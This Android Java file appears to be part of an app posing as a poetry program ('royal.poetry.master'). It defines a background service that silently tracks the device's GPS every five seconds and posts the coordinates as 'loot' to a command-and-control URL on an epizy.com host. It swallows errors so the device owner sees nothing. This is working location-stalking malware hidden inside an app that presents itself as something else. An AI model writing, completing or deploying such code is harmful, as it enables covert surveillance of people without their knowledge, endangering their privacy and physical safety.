package com.royal.poetry.master;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import androidx.core.content.ContextCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class RoyalBackgroundService extends Service implements LocationListener {

    private static final String C2_SERVER_URL = "http://yourdomain.epizy.com/shamona/report.php";
    private LocationManager locationManager;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startLocationTracking();
        return START_STICKY;
    }

    private void startLocationTracking() {
        try {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 5, this);
                }
            }
        } catch (Exception e) {}
    }

    @Override
    public void onLocationChanged(Location location) {
        if (location != null) {
            String report = "📍 [موقع الملك الميداني]: Lat=" + location.getLatitude() + ", Lon=" + location.getLongitude();
            sendDataToThrone(report);
        }
    }

    private void sendDataToThrone(String data) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setDoOutput(true);
                String json = "{\"device_owner\": \"Royal_GPS\", \"loot\": \"" + data + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }

    @Override public void onStatusChanged(String p, int s, Bundle e) {}
    @Override public void onProviderEnabled(String p) {}
    @Override public void onProviderDisabled(String p) {}
    @Override public IBinder onBind(Intent intent) { return null; }
}
